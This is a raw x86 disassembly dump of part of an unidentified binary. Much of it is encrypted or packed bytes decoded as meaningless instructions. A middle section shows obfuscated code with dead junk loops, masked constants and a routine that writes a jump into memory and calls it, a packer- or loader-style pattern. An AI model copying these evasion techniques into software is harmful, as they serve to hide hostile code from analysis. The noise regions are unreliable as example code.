  41b711:	add    eax,0x1370b97e
  41b716:	or     eax,0x43962dfc
  41b71b:	jbe    0x41b6c8
  41b71d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b71e:	pop    ecx
  41b71f:	imul   esp,edx,0x332dd329
  41b725:	mov    bh,0xb9
  41b727:	and    bl,0x78
  41b72a:	and    al,0x13
  41b72c:	cmp    BYTE PTR [ecx-0x5c],ch
  41b72f:	daa    
  41b730:	and    eax,DWORD PTR [edi+0x26]
  41b733:	mov    cl,0x49
  41b735:	inc    esi
  41b736:	add    ebp,edi
  41b738:	push   0xffffffe4
  41b73a:	stc    
  41b73b:	arpl   WORD PTR [edx],si
  41b73d:	ds cmp eax,esi
  41b740:	shr    DWORD PTR [esi-0x63509ec2],1
  41b746:	mov    ah,0xd9
  41b748:	call   0xb7d9:0x8827058b
  41b74f:	push   0x75741b1f
  41b754:	stos   DWORD PTR es:[edi],eax
  41b755:	jb     0x41b747
  41b757:	addr16 dec esp
  41b759:	add    esp,eax
  41b75b:	iret   
  41b75c:	sub    al,0xe4
  41b75e:	bound  edi,QWORD PTR [edi-0x214fb2c5]
  41b764:	clc    
  41b765:	in     eax,0x22
  41b767:	aam    0x66
  41b769:	dec    ebp
  41b76a:	ins    DWORD PTR es:[edi],dx
  41b76b:	les    ecx,FWORD PTR [ebx-0x35]
  41b76e:	jl     0x41b751
  41b770:	out    0xd1,al
  41b772:	leave  
  41b773:	mov    esi,0xb0cf5754
  41b778:	jg     0x41b6fd
  41b77a:	rcl    BYTE PTR [ebx-0x7a7ed89c],cl
  41b780:	in     eax,0xd9
  41b782:	or     esi,DWORD PTR [ecx-0x8]
  41b785:	sbb    BYTE PTR [ebx+0x3761c44b],0x11
  41b78c:	inc    esi
  41b78d:	pop    eax
  41b78e:	daa    
  41b78f:	add    eax,0xf4caf891
  41b794:	arpl   bx,si
  41b796:	aas    
  41b797:	pop    ds
  41b798:	mov    bl,0x31
  41b79a:	pushf  
  41b79b:	(bad)  
  41b79c:	and    eax,0xe931635c
  41b7a1:	mov    ebp,0xa35faa32
  41b7a6:	leave  
  41b7a7:	jg     0x41b7bf
  41b7a9:	mov    ah,0x4e
  41b7ab:	cld    
  41b7ac:	(bad)  
  41b7ad:	shl    DWORD PTR [ebx],0xbf
  41b7b0:	cmc    
  41b7b1:	mov    ah,bl
  41b7b3:	push   es
  41b7b4:	loope  0x41b826
  41b7b6:	jmp    0x5d1b5e1b
  41b7bb:	fild   DWORD PTR [edi-0x47]
  41b7be:	mov    esp,0x8499bf3b
  41b7c3:	sub    bh,dh
  41b7c5:	repz fidiv WORD PTR [edi]
  41b7c8:	(bad)  
  41b7c9:	pop    eax
  41b7ca:	jb     0x41b816
  41b7cc:	push   esp
  41b7cd:	stc    
  41b7ce:	or     al,0x30
  41b7d0:	popw   es
  41b7d2:	fld    DWORD PTR [ecx]
  41b7d4:	ror    BYTE PTR [ebp-0x57502009],0xc9
  41b7db:	lods   eax,DWORD PTR ds:[esi]
  41b7dc:	lahf   
  41b7dd:	fst    st(7)
  41b7df:	icebp  
  41b7e0:	test   DWORD PTR [edi],edx
  41b7e2:	push   ds
  41b7e3:	lahf   
  41b7e4:	popa   
  41b7e5:	cmp    DWORD PTR [edx+0x64],esp
  41b7e8:	pop    esi
  41b7e9:	stos   DWORD PTR es:[edi],eax
  41b7ea:	or     eax,0x31f57ef5
  41b7ef:	mov    esi,0x4978d734
  41b7f4:	xor    DWORD PTR [ebx-0x7977f83b],ebx
  41b7fa:	jae    0x41b864
  41b7fc:	add    DWORD PTR [ebp+0x5b],0x6b
  41b800:	ja     0x41b7af
  41b802:	icebp  
  41b803:	jmp    0xd550:0x5af53db1
  41b80a:	mov    cl,0xb0
  41b80c:	sar    DWORD PTR [eiz*2-0x486e37a0],0xd7
  41b814:	or     ebx,ebx
  41b816:	imul   ebx,ebx,0xe2e2cf25
  41b81c:	xchg   DWORD PTR cs:[edx+0xcf8cf26],ebp
  41b823:	loopne 0x41b7ed
  41b825:	daa    
  41b826:	push   ds
  41b827:	xor    dh,BYTE PTR [ebp-0x29]
  41b82a:	adc    bh,BYTE PTR [edx-0x6616f8e2]
  41b830:	sub    esp,DWORD PTR [edi-0x2f]
  41b833:	gs xchg esp,eax
  41b835:	idiv   ecx
  41b837:	cmp    DWORD PTR [edi+0xcef5a37],esp
  41b83d:	inc    ebx
  41b83e:	adc    ebp,edi
  41b840:	push   eax
  41b841:	pushf  
  41b842:	fdiv   QWORD PTR [ecx-0x21]
  41b845:	repz loopne 0x41b893
  41b848:	out    0xac,eax
  41b84a:	sbb    edx,DWORD PTR [ecx-0x3b2745e]
  41b850:	and    DWORD PTR ds:0x428ec3,0x32ec
  41b85a:	sub    eax,ecx
  41b85c:	mov    DWORD PTR [ebp-0x4],eax
  41b85f:	add    DWORD PTR ds:0x428e6b,0x1dd5
  41b869:	or     DWORD PTR [ebp-0x4],0xf89c85a0
  41b870:	xor    DWORD PTR ds:0x428e7f,ebx
  41b876:	mov    eax,DWORD PTR [ebp-0xc]
  41b879:	dec    DWORD PTR ds:0x428e67
  41b87f:	xor    eax,esi
  41b881:	or     DWORD PTR ds:0x428e33,0x9ab
  41b88b:	add    eax,edi
  41b88d:	push   eax
  41b88e:	mov    eax,DWORD PTR [ebp-0x10]
  41b891:	xor    eax,esi
  41b893:	add    DWORD PTR ds:0x428eab,0x428e6b
  41b89d:	add    eax,edi
  41b89f:	and    DWORD PTR ds:0x428e67,0x428e87
  41b8a9:	push   eax
  41b8aa:	mov    eax,DWORD PTR [ebp-0x4]
  41b8ad:	or     DWORD PTR ds:0x428e2b,0x148
  41b8b7:	xor    eax,esi
  41b8b9:	xor    DWORD PTR ds:0x428e83,0x7f59
  41b8c3:	add    eax,0x3272fa
  41b8c8:	push   eax
  41b8c9:	lea    eax,[ebp-0x78]
  41b8cc:	push   eax
  41b8cd:	push   DWORD PTR [ebp-0x2c]
  41b8d0:	push   DWORD PTR [ebp-0x28]
  41b8d3:	call   0x411af5
  41b8d8:	test   eax,eax
  41b8da:	je     0x41b908
  41b8e0:	lea    eax,[ebp-0x78]
  41b8e3:	push   eax
  41b8e4:	mov    eax,DWORD PTR [ebp-0x28]
  41b8e7:	xor    eax,esi
  41b8e9:	add    eax,edi
  41b8eb:	push   eax
  41b8ec:	mov    eax,DWORD PTR [ebp-0x24]
  41b8ef:	add    eax,0xaa
  41b8f4:	push   eax
  41b8f5:	mov    eax,DWORD PTR [ebp-0x24]
  41b8f8:	mov    eax,DWORD PTR [eax+0x198]
  41b8fe:	push   DWORD PTR [eax]
  41b900:	call   0x4061d0
  41b905:	mov    DWORD PTR [ebp-0x14],eax
  41b908:	mov    ecx,DWORD PTR ds:0x42846b
  41b90e:	lea    eax,[ebp+0x4]
  41b911:	mov    DWORD PTR [ecx*4+0x428463],eax
  41b918:	inc    DWORD PTR ds:0x42846b
  41b91e:	mov    eax,DWORD PTR [ebp-0x14]
  41b921:	test   eax,eax
  41b923:	je     0x41b995
  41b929:	lea    eax,[ebp-0x8]
  41b92c:	mov    DWORD PTR [ebp-0x34],eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x30]
  41b932:	mov    DWORD PTR [ebp-0x8],eax
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	mov    ecx,DWORD PTR [ebp-0x14]
  41b93b:	sub    eax,ecx
  41b93d:	mov    DWORD PTR [ebp-0x8],eax
  41b940:	mov    ecx,DWORD PTR [ebp-0x4]
  41b943:	xor    ecx,esi
  41b945:	mov    eax,0xffcd8d0a
  41b94a:	sub    eax,ecx
  41b94c:	add    DWORD PTR [ebp-0x8],eax
  41b94f:	mov    eax,DWORD PTR [ebp-0x14]
  41b952:	mov    DWORD PTR [eax],0x675565e9
  41b958:	mov    DWORD PTR [eax+0x4],0x76576787
  41b95f:	mov    eax,DWORD PTR [ebp-0x8]
  41b962:	mov    ecx,DWORD PTR [ebp-0x14]
  41b965:	push   DWORD PTR [ebp-0x24]
  41b968:	mov    DWORD PTR [ecx+0x1],eax
  41b96b:	mov    eax,ds:0x4281ef
  41b970:	push   DWORD PTR [eax]
  41b972:	push   DWORD PTR ds:0x428453
  41b978:	push   DWORD PTR ds:0x4281f7
  41b97e:	push   DWORD PTR ds:0x428433
  41b984:	push   DWORD PTR ds:0x428c1f
  41b98a:	push   DWORD PTR [ebp-0x28]
  41b98d:	push   DWORD PTR [ebp-0x2c]
  41b990:	mov    eax,DWORD PTR [ebp-0x14]
  41b993:	call   eax
  41b995:	pop    edi
  41b996:	pop    esi
  41b997:	leave  
  41b998:	ret    
  41b999:	push   ebp
  41b99a:	mov    ebp,esp
  41b99c:	sub    esp,0x34
  41b99f:	push   ebx
  41b9a0:	dec    edx
  41b9a1:	push   esi
  41b9a2:	push   edi
  41b9a3:	xor    ecx,ecx
  41b9a5:	xor    ecx,DWORD PTR ds:0x4292bf
  41b9ab:	mov    esi,DWORD PTR ds:0x429bb7
  41b9b1:	sub    esi,ecx
  41b9b3:	sub    ecx,DWORD PTR [ecx+esi*1]
  41b9b6:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  41b9bd:	lea    eax,[ebp+0x14]
  41b9c0:	and    DWORD PTR ds:0x428eb3,0x0
  41b9ca:	mov    esi,DWORD PTR ds:0x428eb3
  41b9d0:	inc    esi
  41b9d1:	mov    DWORD PTR ds:0x428eb3,esi
  41b9d7:	cmp    DWORD PTR ds:0x428eb3,0x6
  41b9de:	jg     0x41ba1e
  41b9e4:	jmp    0x41b9f7
  41b9e9:	push   0x428e6b
  41b9ee:	push   DWORD PTR [ebp-0x20]
  41b9f1:	call   DWORD PTR ds:0x42aa0f
  41b9f7:	cmp    DWORD PTR ds:0x428eb3,0x5
  41b9fe:	jne    0x41ba11
  41ba04:	mov    esi,DWORD PTR ds:0x428eb3
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x428eb3,esi
  41ba11:	cmp    DWORD PTR ds:0x428eb3,0x1f
  41ba18:	jb     0x41b9ca
  41ba1e:	mov    DWORD PTR [ebp-0x4],eax
  41ba21:	sbb    edx,DWORD PTR ds:0x428ec7
  41ba27:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  41ba2e:	mov    DWORD PTR ds:0x428e2f,0x1d
  41ba38:	cmp    DWORD PTR ds:0x428e2f,0x0
  41ba3f:	je     0x41ba75
  41ba45:	cmp    DWORD PTR ds:0x428e2f,0x26
  41ba4c:	jle    0x41ba75
  41ba52:	jmp    0x41ba63
  41ba57:	push   DWORD PTR [ebp-0x24]
  41ba5a:	push   DWORD PTR [ebp-0x28]
  41ba5d:	call   DWORD PTR ds:0x42aa13
  41ba63:	mov    ecx,DWORD PTR ds:0x428e2f
  41ba69:	dec    ecx
  41ba6a:	mov    DWORD PTR ds:0x428e2f,ecx
  41ba70:	jmp    0x41ba38
  41ba75:	lea    eax,[ebp-0xc]
  41ba78:	and    DWORD PTR ds:0x428e5b,0x0
  41ba82:	jmp    0x41ba94
  41ba87:	mov    ecx,DWORD PTR ds:0x428e5b
  41ba8d:	inc    ecx
  41ba8e:	mov    DWORD PTR ds:0x428e5b,ecx
  41ba94:	cmp    DWORD PTR ds:0x428e5b,0x1d
  41ba9b:	jae    0x41bac3
  41baa1:	cmp    DWORD PTR ds:0x428e5b,0x2b
  41baa8:	jge    0x41bac3
  41baae:	jmp    0x41babe
  41bab3:	push   0x428e2f
  41bab8:	call   DWORD PTR ds:0x42aa17
  41babe:	jmp    0x41ba87
  41bac3:	mov    DWORD PTR [ebp-0x14],eax
  41bac6:	mov    eax,DWORD PTR [ebp-0xc]
  41bac9:	mov    esi,DWORD PTR ds:0x428e33
  41bacf:	or     DWORD PTR ds:0x428e6b,esi
  41bad5:	mov    edx,DWORD PTR [ebp-0x14]
  41bad8:	and    DWORD PTR ds:0x428e77,0x0
  41bae2:	jmp    0x41baf4
  41bae7:	mov    ecx,DWORD PTR ds:0x428e77
  41baed:	inc    ecx
  41baee:	mov    DWORD PTR ds:0x428e77,ecx
  41baf4:	cmp    DWORD PTR ds:0x428e77,0x19
  41bafb:	jae    0x41bb3b
  41bb01:	cmp    DWORD PTR ds:0x428e77,0x9
  41bb08:	jle    0x41bb3b
  41bb0e:	jmp    0x41bb1c
  41bb13:	push   DWORD PTR [ebp-0x28]
  41bb16:	call   DWORD PTR ds:0x42aa1b
  41bb1c:	cmp    DWORD PTR ds:0x428e77,0x8
  41bb23:	jne    0x41bb36
  41bb29:	mov    ecx,DWORD PTR ds:0x428e77
  41bb2f:	inc    ecx
  41bb30:	mov    DWORD PTR ds:0x428e77,ecx
  41bb36:	jmp    0x41bae7
  41bb3b:	mov    ecx,0x75108af
  41bb40:	mov    esi,DWORD PTR ds:0x428e33
  41bb46:	add    DWORD PTR ds:0x428e47,esi
  41bb4c:	xor    eax,ecx
  41bb4e:	sub    DWORD PTR ds:0x428e6f,0x2684
  41bb58:	add    eax,0x3272f6
  41bb5d:	mov    DWORD PTR [edx],eax
  41bb5f:	sbb    eax,eax
  41bb61:	mov    eax,ds:0x4281eb
  41bb66:	mov    DWORD PTR ds:0x428e8b,0x1a
  41bb70:	cmp    DWORD PTR ds:0x428e8b,0x0
  41bb77:	je     0x41bbcc
  41bb7d:	cmp    DWORD PTR ds:0x428e8b,0xd
  41bb84:	jge    0x41bbcc
  41bb8a:	jmp    0x41bba0
  41bb8f:	push   DWORD PTR [ebp-0x18]
  41bb92:	push   0x428eab
  41bb97:	push   DWORD PTR [ebp-0x10]
  41bb9a:	call   DWORD PTR ds:0x42aa1f
  41bba0:	cmp    DWORD PTR ds:0x428e8b,0xe
  41bba7:	jne    0x41bbba
  41bbad:	mov    edx,DWORD PTR ds:0x428e8b
  41bbb3:	dec    edx
  41bbb4:	mov    DWORD PTR ds:0x428e8b,edx
  41bbba:	mov    edx,DWORD PTR ds:0x428e8b
  41bbc0:	dec    edx
  41bbc1:	mov    DWORD PTR ds:0x428e8b,edx
  41bbc7:	jmp    0x41bb70
  41bbcc:	mov    edx,DWORD PTR [ebp-0x4]
  41bbcf:	or     esi,0x7d03
  41bbd5:	mov    eax,DWORD PTR [eax]
  41bbd7:	mov    DWORD PTR ds:0x428ebf,0x12
  41bbe1:	cmp    DWORD PTR ds:0x428ebf,0x0
  41bbe8:	je     0x41bc1d
  41bbee:	cmp    DWORD PTR ds:0x428ebf,0x18
  41bbf5:	jl     0x41bc1d
  41bbfb:	jmp    0x41bc0b
  41bc00:	push   0x428000
  41bc05:	call   DWORD PTR ds:0x42a9eb
  41bc0b:	mov    esi,DWORD PTR ds:0x428ebf
  41bc11:	dec    esi
  41bc12:	mov    DWORD PTR ds:0x428ebf,esi
  41bc18:	jmp    0x41bbe1
  41bc1d:	add    eax,DWORD PTR [edx]
  41bc1f:	mov    DWORD PTR [ebp-0x8],eax
  41bc22:	mov    esi,DWORD PTR [ebp+0x8]
  41bc25:	mov    eax,ds:0x428373
  41bc2a:	and    DWORD PTR ds:0x428e33,0x0
  41bc34:	jmp    0x41bc46
  41bc39:	mov    edx,DWORD PTR ds:0x428e33
  41bc3f:	inc    edx
  41bc40:	mov    DWORD PTR ds:0x428e33,edx
  41bc46:	cmp    DWORD PTR ds:0x428e33,0x1c
  41bc4d:	jae    0x41bc8f
  41bc53:	cmp    DWORD PTR ds:0x428e33,0x8
  41bc5a:	jbe    0x41bc8f
  41bc60:	jmp    0x41bc70
  41bc65:	push   0x428189
  41bc6a:	call   DWORD PTR ds:0x42a9ef
  41bc70:	cmp    DWORD PTR ds:0x428e33,0x7
  41bc77:	jne    0x41bc8a
  41bc7d:	mov    edx,DWORD PTR ds:0x428e33
  41bc83:	inc    edx
  41bc84:	mov    DWORD PTR ds:0x428e33,edx
  41bc8a:	jmp    0x41bc39
  41bc8f:	mov    eax,DWORD PTR [eax+0x198]
  41bc95:	and    DWORD PTR ds:0x428eaf,0x0
  41bc9f:	mov    edx,DWORD PTR ds:0x428eaf
  41bca5:	inc    edx
  41bca6:	mov    DWORD PTR ds:0x428eaf,edx
  41bcac:	cmp    DWORD PTR ds:0x428eaf,0x19
  41bcb3:	jbe    0x41bcd6
  41bcb9:	jmp    0x41bcc9
  41bcbe:	push   0x5031
  41bcc3:	call   DWORD PTR ds:0x42a9f3
  41bcc9:	cmp    DWORD PTR ds:0x428eaf,0x10
  41bcd0:	jb     0x41bc9f
  41bcd6:	xor    esi,ecx
  41bcd8:	mov    edx,0x3272f6
  41bcdd:	add    esi,edx
  41bcdf:	mov    DWORD PTR ds:0x428e7f,0x53fd
  41bce9:	cmp    DWORD PTR [eax],esi
  41bceb:	mov    DWORD PTR ds:0x428e27,0x6856
  41bcf5:	je     0x41bd16
  41bcfb:	mov    DWORD PTR ds:0x428e6f,0x6d53
  41bd05:	mov    eax,DWORD PTR [eax]
  41bd07:	mov    DWORD PTR ds:0x428e5f,0xa8d
  41bd11:	jmp    0x420797
  41bd16:	or     DWORD PTR ds:0x428ec7,ecx
  41bd1c:	mov    eax,DWORD PTR [ebp+0x18]
  41bd1f:	mov    esi,DWORD PTR ds:0x428e47
  41bd25:	adc    esi,DWORD PTR ds:0x428eb3
  41bd2b:	mov    DWORD PTR ds:0x428e47,esi
  41bd31:	mov    esi,DWORD PTR [ebp+0x1c]
  41bd34:	add    DWORD PTR ds:0x428e7f,0x428e53
  41bd3e:	or     ebx,0xffffffff
  41bd41:	jmp    0x41e0ba
  41bd46:	scas   al,BYTE PTR es:[edi]
  41bd47:	fwait
  41bd48:	or     ah,BYTE PTR [esi+eax*1-0x1c]
  41bd4c:	mov    WORD PTR [ecx-0x36abec4b],ds
  41bd52:	or     ch,dh
  41bd54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd55:	jl     0x41bd7e
  41bd57:	std    
  41bd58:	add    BYTE PTR [ebx-0x7c7c9fd9],0x77
  41bd5f:	jecxz  0x41bd6a
  41bd61:	mov    bh,bh
  41bd63:	daa    
  41bd64:	pop    ecx
  41bd65:	in     al,dx
  41bd66:	imul   al
  41bd68:	pop    esp
  41bd69:	or     eax,0x3faf2c76
  41bd6e:	xchg   BYTE PTR [esi],dh
  41bd70:	push   esi
  41bd71:	stos   BYTE PTR es:[edi],al
  41bd72:	nop
  41bd73:	cli    
  41bd74:	sub    eax,0xa654cf69
  41bd79:	fcomp  st(7)
  41bd7b:	das    
  41bd7c:	test   esp,ebp
  41bd7e:	xor    BYTE PTR [ebx-0xd343257],al
  41bd84:	push   edx
  41bd85:	hlt    
  41bd86:	cmp    eax,0x64f2d7aa
  41bd8b:	or     eax,0x18e673e6
  41bd90:	dec    BYTE PTR [edi+0x5a]
  41bd93:	pop    esp
  41bd94:	inc    eax
  41bd95:	stc    
  41bd96:	int    0x61
  41bd98:	cwde   
  41bd99:	sti    
  41bd9a:	repz loop 0x41bd2c
  41bd9d:	sub    ecx,DWORD PTR [edx-0x44a18556]
  41bda3:	adc    DWORD PTR [ebx+eax*1],ebx
  41bda6:	adc    bh,BYTE PTR [edx+0x66]
  41bda9:	fld    QWORD PTR [edx-0x237b35f4]
  41bdaf:	cmp    al,BYTE PTR [edi-0x66311121]
  41bdb5:	cmp    eax,0x37a63b5b
  41bdba:	gs and eax,0x6df11341
  41bdc0:	inc    esi
  41bdc1:	outs   dx,DWORD PTR ds:[esi]
  41bdc2:	xor    BYTE PTR [ebp+0x5c],ah
  41bdc5:	je     0x41bd77
  41bdc7:	ret    0x41b9
  41bdca:	push   ds
  41bdcb:	retf   0x72fa
  41bdce:	lea    ecx,[ebx+0x24b57f87]
  41bdd4:	and    al,0x98
  41bdd6:	stos   DWORD PTR es:[edi],eax
  41bdd7:	dec    ebx
  41bdd8:	rcr    DWORD PTR [ecx],0x8f
  41bddb:	ret    
  41bddc:	or     BYTE PTR [ebp+0x0],al
  41bddf:	add    ecx,eax
  41bde1:	sbb    eax,0x47d82ff3
  41bde6:	push   esp
  41bde7:	mov    WORD PTR [edx],cs
  41bde9:	or     edx,edx
  41bdeb:	xor    al,0xfe
  41bded:	mov    cl,0x63
  41bdef:	cs popa 
  41bdf1:	push   esp
  41bdf2:	aaa    
  41bdf3:	dec    edx
  41bdf4:	clc    
  41bdf5:	mov    es,WORD PTR [ecx-0x4947bc5a]
  41bdfb:	call   0x72e74469
  41be00:	aas    
  41be01:	out    dx,eax
  41be02:	sub    ch,BYTE PTR [edx+0x1f]
  41be05:	icebp  
  41be06:	xchg   edi,eax
  41be07:	dec    eax
  41be08:	sbb    ah,BYTE PTR [ebx]
  41be0a:	dec    eax
  41be0b:	mov    eax,ds:0x19e85ec3
  41be10:	stc    
  41be11:	cwde   
  41be12:	xor    edi,DWORD PTR [esi]
  41be14:	pop    esp
  41be15:	mov    dh,0xdf
  41be17:	dec    eax
  41be18:	retf   
  41be19:	add    al,0xab
  41be1b:	(bad)  
  41be1c:	mov    ebp,0xa95e8436
  41be21:	jne    0x41bda5
  41be23:	xor    dl,BYTE PTR [ecx]
  41be25:	pushf  
  41be26:	jmp    0x6c4b:0x52969dd5
  41be2d:	call   0x2798:0x9d5a6294
  41be34:	cld    
  41be35:	jae    0x41be15
  41be37:	jg     0x41bde1
  41be39:	aaa    
  41be3a:	jp     0x41be5a
  41be3c:	int    0xab
  41be3e:	and    dl,BYTE PTR [eax+0x79]
  41be41:	jne    0x41be06
  41be43:	pushf  
  41be44:	mov    al,ds:0x15ab24b9
  41be49:	mov    bl,0xd7
  41be4b:	out    dx,al
  41be4c:	or     edx,eax
  41be4e:	pop    edx
  41be4f:	pop    es
  41be50:	test   eax,ecx
  41be52:	mov    BYTE PTR [edi+0x211cb00d],dl
  41be58:	cdq    
  41be59:	jno    0x41be37
  41be5b:	mov    edi,0xcc18fe9b
  41be60:	sub    BYTE PTR [ecx+0xf],ch
  41be63:	add    al,0x40
  41be65:	or     al,0x8e
  41be67:	push   esp
  41be68:	std    
  41be69:	cmp    eax,0xaf0fb2d4
  41be6e:	repz mov ecx,esp
  41be71:	in     eax,dx
  41be72:	cmp    al,0xab
  41be74:	jg     0x41be6b
  41be76:	call   0xde9f5da9
  41be7b:	mov    esp,0xda138f5d
  41be80:	sar    BYTE PTR [ecx-0x5dfd1e7a],0xf5
  41be87:	pushf  
  41be88:	mov    esi,0x94831627
  41be8d:	imul   eax,DWORD PTR [eax],0x429dff6d
  41be93:	mov    dl,0xd7
  41be95:	ret    0xe6ab
  41be98:	mov    dh,0x7a
  41be9a:	xchg   esp,eax
  41be9b:	dec    esp
  41be9c:	cs sbb eax,0xffc0c026
  41bea2:	int3   
  41bea3:	outs   dx,BYTE PTR ds:[esi]
  41bea4:	jecxz  0x41beff
  41bea6:	lock test BYTE PTR [edx],0x46
  41beaa:	push   edi
  41beab:	dec    esp
  41beac:	and    al,0x91
  41beae:	push   ebx
  41beaf:	mov    BYTE PTR [ebp-0x40],cl
  41beb2:	(bad)  
  41beb3:	int    0xe7
  41beb5:	ds ss pop edx
  41beb8:	stos   BYTE PTR es:[edi],al
  41beb9:	inc    edi
  41beba:	push   eax
  41bebb:	stos   BYTE PTR es:[edi],al
  41bebc:	push   edi
  41bebd:	push   ecx
  41bebe:	inc    edx
  41bebf:	or     al,0xcf
  41bec1:	mov    al,ds:0x386c8520
  41bec6:	pop    esp
  41bec7:	push   cs
  41bec8:	mov    ah,0xb8
  41beca:	adc    esi,eax
  41becc:	or     al,0x16
  41bece:	in     eax,dx
  41becf:	hlt    
  41bed0:	or     BYTE PTR [esi-0x539b0d],ch
  41bed6:	outs   dx,DWORD PTR ds:[esi]
  41bed7:	jg     0x41bf4e
  41bed9:	push   0x2592ee0a
  41bede:	mov    al,0x49
  41bee0:	shl    dh,0xc1
  41bee3:	popf   
  41bee4:	cmp    al,0x9a
  41bee6:	inc    esp
  41bee7:	and    ah,al
  41bee9:	xchg   edx,eax
  41beea:	or     eax,0x368f6f15
  41beef:	dec    ebp
  41bef0:	xchg   esp,eax
  41bef1:	ret    0x2f5c
  41bef4:	and    eax,0x85f5ca71
  41bef9:	into   
  41befa:	hlt    
  41befb:	(bad)  
  41befc:	loope  0x41bf4b
  41befe:	(bad)  
  41beff:	and    BYTE PTR [edx+esi*4-0x5d],cl
  41bf03:	inc    esp
  41bf04:	(bad)  
  41bf05:	push   ebp
  41bf06:	push   ss
  41bf07:	outs   dx,DWORD PTR ds:[esi]
  41bf08:	xchg   esp,eax
  41bf09:	ins    BYTE PTR es:[edi],dx
  41bf0a:	test   edi,0x95779a4d
  41bf10:	retf   
  41bf11:	dec    ebx
  41bf12:	mov    edi,0x2fb2bf5c
  41bf17:	sub    al,0xa
  41bf19:	pop    ecx
  41bf1a:	inc    ecx
  41bf1b:	repz mov bh,0x4e
  41bf1e:	shr    edi,cl
  41bf20:	dec    edi
  41bf21:	mov    ebp,0x5c52d17a
  41bf26:	fmul   QWORD PTR [eax+0x43aaab89]
  41bf2c:	loop   0x41bf02
  41bf2e:	inc    eax
  41bf2f:	out    0x4f,al
  41bf31:	dec    ebx
  41bf32:	xchg   esi,eax
  41bf33:	fmul   QWORD PTR [ecx-0x655c955e]
  41bf39:	(bad)  
  41bf3a:	push   ecx
  41bf3b:	mov    esp,0x9351b8f0
  41bf40:	cmp    ah,dh
  41bf42:	pop    ecx
  41bf43:	sub    esp,DWORD PTR [ebx+0x45d2fa4d]
  41bf49:	mov    bh,0xba
  41bf4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf4c:	xchg   ebx,eax
  41bf4d:	xchg   ecx,eax
  41bf4e:	inc    eax
  41bf4f:	sbb    al,0xfd
  41bf51:	sub    ebx,DWORD PTR [ebp+0x7e]
  41bf54:	stos   DWORD PTR es:[edi],eax
  41bf55:	clc    
  41bf56:	or     eax,0x48300100
  41bf5b:	leave  
  41bf5c:	pop    ebx
  41bf5d:	aad    0x45
  41bf5f:	push   esi
  41bf60:	jl     0x41bf9b
  41bf62:	fidiv  WORD PTR [edx+edi*2-0x4c09ee08]
  41bf69:	adc    ah,al
  41bf6b:	sahf   
  41bf6c:	xchg   ebp,eax
  41bf6d:	call   0x180fce8e
  41bf72:	sbb    BYTE PTR [ebp-0x14],bl
  41bf75:	mov    bh,0x2f
  41bf77:	mov    bh,ch
  41bf79:	mov    bl,0x9c
  41bf7b:	cli    
  41bf7c:	dec    edi
  41bf7d:	or     al,0xa
  41bf7f:	adc    BYTE PTR [ecx-0x7b483294],0x4f
  41bf86:	sub    bh,BYTE PTR [eax-0x6e]
  41bf89:	xchg   ebp,eax
  41bf8a:	adc    dh,BYTE PTR [ebp+eax*8-0x2d2da25c]
  41bf91:	fist   DWORD PTR [ebp-0x3b]
  41bf94:	dec    eax
  41bf95:	mov    al,al
  41bf97:	or     DWORD PTR [edi+0x3b0bb3a4],0x9185aeed
  41bfa1:	adc    eax,0xc8502b66
  41bfa6:	adc    cl,BYTE PTR [ecx+0x53]
  41bfa9:	jl     0x41bfeb
  41bfab:	dec    esi
  41bfac:	inc    DWORD PTR [edx+0x2eb6797e]
  41bfb2:	xchg   esp,eax
  41bfb3:	mov    ds:0x664607f0,eax
  41bfb8:	xor    bh,ch
  41bfba:	fisub  DWORD PTR [ecx-0x27]
  41bfbd:	sbb    ecx,DWORD PTR [ecx-0x39d50f9f]
  41bfc3:	adc    eax,0x59c268c6
  41bfc8:	inc    ecx
  41bfc9:	das    
  41bfca:	xchg   esi,eax
  41bfcb:	mov    ds:0x10e1f69f,eax
  41bfd0:	rcr    DWORD PTR [ecx-0x12],cl
  41bfd3:	jae    0x41c00f
  41bfd5:	sub    eax,0x7a27d478
  41bfda:	or     al,0x28
  41bfdc:	dec    edx
  41bfdd:	cli    
  41bfde:	loope  0x41c03d
  41bfe0:	dec    eax
  41bfe1:	push   edi
  41bfe2:	fdivr  st,st(1)
  41bfe4:	out    dx,eax
  41bfe5:	mov    bh,0x11
  41bfe7:	xchg   ebp,eax
  41bfe8:	into   
  41bfe9:	jae    0x41c02f
  41bfeb:	jo     0x41c019
  41bfed:	and    al,0x37
  41bfef:	outs   dx,DWORD PTR ds:[esi]
  41bff0:	out    dx,al
  41bff1:	ins    DWORD PTR es:[edi],dx
  41bff2:	cmp    BYTE PTR [ecx+0x2d],0x30
  41bff6:	les    edi,FWORD PTR ds:0xe1fefe3c
  41bffc:	addr16 (bad) 
  41bffe:	push   ss
  41bfff:	scas   eax,DWORD PTR es:[edi]
  41c000:	or     al,0x18
  41c002:	jns    0x41bf8b
  41c004:	jge    0x41c051
  41c006:	cmp    al,0x1c
  41c008:	cld    
  41c009:	das    
  41c00a:	mov    ds:0x93b6efec,eax
  41c00f:	xor    eax,0xf315923e
  41c014:	cmp    ebp,ebx
  41c016:	das    
  41c017:	sub    ah,BYTE PTR [ecx]
  41c019:	fisttp WORD PTR [edx-0x75]
  41c01c:	sub    eax,0x998f4af2
  41c021:	sub    al,bh
  41c023:	iret   
  41c024:	aad    0xc5
  41c026:	sub    eax,0x71aa9851
  41c02b:	mov    dl,0x30
  41c02d:	in     eax,dx
  41c02e:	add    eax,0x98498923
  41c033:	cmp    dl,bl
  41c035:	push   ebx
  41c036:	mov    eax,0x5f9d7015
  41c03b:	inc    esi
  41c03c:	dec    esp
  41c03d:	sbb    ch,ah
  41c03f:	mul    BYTE PTR [edx+0x30db22c3]
  41c045:	shr    BYTE PTR [edx-0x56],0xf5
  41c049:	add    al,0xde
  41c04b:	ror    BYTE PTR [ecx+0x6181ef99],1
  41c051:	das    
  41c052:	mov    edi,0xde300735
  41c057:	and    ah,ch
  41c059:	in     al,dx
  41c05a:	adc    BYTE PTR [esp+edx*8+0x64],bl
  41c05e:	fild   DWORD PTR [eax+eiz*1]
  41c061:	div    DWORD PTR [edx]
  41c063:	inc    ebx
  41c064:	xchg   ebp,eax
